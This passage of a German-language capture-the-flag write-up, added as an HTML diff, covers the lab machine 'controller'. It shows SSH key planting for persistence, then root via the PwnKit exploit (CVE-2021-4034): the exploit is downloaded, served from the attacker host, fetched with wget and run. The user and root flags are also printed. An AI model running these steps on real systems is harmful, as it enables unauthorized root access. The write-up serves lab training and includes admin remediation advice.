+<span class="command">tester</span>
+<span class="command">webservices</span>
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tester@controller:~$ <span class="command">ls /home/webservices/</span></div>
+                    <pre>ls /home/webservices/
+<span class="command">user.txt</span>
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tester@controller:~$ <span class="command">cat /home/webservices/user.txt</span></div>
+                    <pre>cat /home/webservices/user.txt
+<span class="password">K1ng0F3V4S10n</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `tester` wird das `/home`-Verzeichnis aufgelistet. Es gibt die Benutzer `server`, `tester` und `webservices`. Im Verzeichnis `/home/webservices` wird die Datei `user.txt` gefunden und ihr Inhalt ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Mit der Privilegieneskalation zu `root` fortfahren.<br><strong>Empfehlung (Admin):</strong> Berechtigungen von Home-Verzeichnissen überprüfen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tester@controller:~$ <span class="command">mkdir .ssh</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~$ <span class="command">cat /etc/*-release</span></div>
+                    <pre>
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=20.04
+DISTRIB_CODENAME=focal
+DISTRIB_DESCRIPTION="<span class="command">Ubuntu 20.04.2 LTS</span>"
+[...]
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tester@controller:~$ <span class="command">cat /etc/ssh/sshd_config | grep Permi</span></div>
+                    <pre>
+PermitRootLogin yes
+#PermitEmptyPasswords no
+# the setting of "PermitRootLogin without-password".
+#PermitTTY yes
+#PermitUserEnvironment no
+#PermitTunnel no
+#	PermitTTY no
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Betriebssystem wird als Ubuntu 20.04.2 LTS identifiziert. Die SSH-Konfiguration wird überprüft und zeigt, dass Root-Login (`PermitRootLogin yes`) erlaubt ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die OS-Version ist wichtig für die Exploit-Suche. Die Erlaubnis zum Root-Login ist eine potenzielle Schwachstelle, falls das Root-Passwort schwach ist oder anderweitig erlangt werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen SSH-Schlüssel für `tester` einrichten, um stabilen Zugriff zu haben. Nach Möglichkeiten zur Privilegieneskalation suchen.<br><strong>Empfehlung (Admin):</strong> Root-Login über SSH sollte idealerweise deaktiviert werden (`PermitRootLogin prohibit-password` oder `no`).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /root/.ssh/id_rsa.pub</span></div>
+                    <pre>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD6iwCfkt5ps5VHhY13FbW1JQh/iNT/vp+xSDB2+bKqnBIO0mFxzD7RFsuRtFyDQuHB4c2q06kSBF/yIaP4PQGW8tEY634DkXFI0Q7h4ll4LCL/rtwvx1CxLqxP+94iPqOXFjdRDquet50njrlslRGLSp+ptQzq23dH9s75gTJOW/KDAcCiuY2noN7WHabsz0XbR3z40NFGCezeYDzYbSnbPtMx5HSAlT/sB3chZWgltVwy96zJ81Vvwd41fsugeMIFxK0+BLxynPGKHBBOd84f11T5OF+Zhw9gMoHhCeAcHjYZ4Wpp3pydZYREPRM5Un+MqxFnEpo7GctIIvi6OYFCjSFUn3ih0udX4q+TeCID4oXrAfgu8YWWvM+w4vF5NedEisAJ2yPoraEyJr//HphqgrpWZnuTx4sHcocJNjPscTdvubuicXr0fqbVtpFWoXj5EzdpdbQA52cMBumJy/IEH5gt2n5gLcIW/zaagH4GyhA5JvMZNgGaULOP1BfCMos=
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Ziel als tester -->
+                    <div class="prompt">tester@controller:~/.ssh$ <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ...(Key)...fCMos=" > authorized_keys</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tester@controller:~/.ssh$ <span class="command">ls</span></div>
+                    <pre>
+authorized_keys
+                    </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~/.ssh$ <span class="command">chmod 600 authorized_keys</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der öffentliche SSH-Schlüssel des Angreifers wird in die Datei `/home/tester/.ssh/authorized_keys` auf dem Zielsystem geschrieben. Die Berechtigungen der Datei werden korrekt auf `600` gesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ermöglicht dem Angreifer nun, sich per SSH als Benutzer `tester` mit seinem privaten Schlüssel anzumelden, was stabiler als die Netcat-Shell ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Eine neue SSH-Verbindung als `tester` aufbauen.<br><strong>Empfehlung (Admin):</strong> Änderungen an `authorized_keys`-Dateien überwachen.</p>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (tester -> root via PwnKit)</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh tester@controller.hmv</span></div>
+                    <pre>
+The authenticity of host 'controller.hmv (192.168.2.149)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password">(Passphrase eingegeben)</span>
+
+<span class="prompt">$</span> <span class="command">id</span>
+<span class="command">uid=1001(tester) gid=1001(tester) groups=1001(tester)</span>
+<span class="prompt">$</span> <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="prompt">tester@controller:~$</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung als `tester` wird erfolgreich unter Verwendung des zuvor eingerichteten Schlüssels aufgebaut. Eine PTY-Shell wird für bessere Interaktivität gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Stabiler Zugriff als `tester` wurde etabliert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach lokalen Privilegieneskalations-Vektoren suchen.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tester@controller:~$ <span class="command">find / -perm -u=s 2>/dev/null</span></div>
+                    <pre>
+[...]
+/snap/core18/2074/usr/bin/sudo
+/snap/core18/2566/usr/bin/sudo
+/snap/snapd/17029/usr/lib/snapd/snap-confine
+/snap/core20/1623/usr/bin/sudo
+/usr/sbin/sensible-mda
+/usr/bin/at
+/usr/bin/procmail
+<span class="command">/usr/bin/pkexec</span>
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/ksu
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Suche nach SUID-Binaries. Die Liste enthält viele Standard-Binaries und solche unter `/snap/`. Besonders interessant ist `/usr/bin/pkexec`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `pkexec` ist bekannt für die Schwachstelle CVE-2021-4034 (PwnKit). Da das System Ubuntu 20.04.2 LTS ist und der Scan von 2022 stammt, ist es sehr wahrscheinlich, dass es anfällig ist, wenn es nicht speziell gepatcht wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen PwnKit-Exploit auf das Zielsystem übertragen und ausführen.<br><strong>Empfehlung (Admin):</strong> System patchen, um CVE-2021-4034 zu beheben.</p>
+
+             <p class="analysis"><strong>Proof of Concept: Privilege Escalation via PwnKit (CVE-2021-4034)</strong><br>
+             Die folgende Sequenz demonstriert die Ausnutzung der PwnKit-Schwachstelle in `pkexec`, um Root-Rechte zu erlangen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Ziel als tester -->
+                    <div class="prompt">tester@controller:~/.ssh$ <span class="command">wget http://192.168.2.140/PwnKit</span></div>
+                    <pre>
+--2022-10-14 21:08:46--  http://192.168.2.140/PwnKit
+Connecting to 192.168.2.140:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18040 (18K) [application/octet-stream]
+Saving to: ‘PwnKit’
+
+PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0s
+
+2022-10-14 21:08:46 (87.6 MB/s) - <span class="password">‘PwnKit’ saved [18040/18040]</span>
+                    </pre>
+                 </div>
+             </div>
+             <!-- Log vom HTTP Server -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt -->
+                     <pre>
+192.168.2.149 - - [14/Oct/2022 23:08:45] "GET /PwnKit HTTP/1.1" 200 -
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~/.ssh$ <span class="command">mv PwnKit ..</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~$ <span class="command">chmod +x PwnKit</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">tester@controller:~$ <span class="command">./PwnKit</span></div>
+                    <pre>
+<span class="password">root@controller:/home/tester#</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein bekannter PwnKit-Exploit wird von GitHub heruntergeladen, per HTTP-Server bereitgestellt und auf das Zielsystem (als `tester`) heruntergeladen. Der Exploit wird ausführbar gemacht und ausgeführt. Das Ergebnis ist eine Root-Shell (`root@controller`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die PwnKit-Schwachstelle wurde erfolgreich ausgenutzt, um volle Root-Rechte auf dem System zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> System dringend patchen, um CVE-2021-4034 zu beheben. Überprüfen, ob der Angreifer Persistenzmechanismen eingerichtet hat.</p>
+        </section>
+
+        <section id="flags">
+             <h2>Flags</h2>
+
+             <div class="flag-container">
+                 <!-- User Flag Eintrag -->
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /home/webservices/user.txt</div>
+                    <div class="flag-value"><span class="password">K1ng0F3V4S10n</span></div>
+                </div>
+
+                 <!-- Root Flag Eintrag -->
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">root@controller:~# <span class="command">cat root.txt</span></div>
+                         <pre><span class="password">DpKg1sB3tt3rTh4nPyth0n?</span></pre>
+                      </div>
+                 </div>
+                 <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">DpKg1sB3tt3rTh4nPyth0n?</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer wird die Datei `/root/root.txt` direkt ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Root-Flag wurde erfolgreich extrahiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. Oktober 2022</p>
+    </footer>
+</body>
+</html>
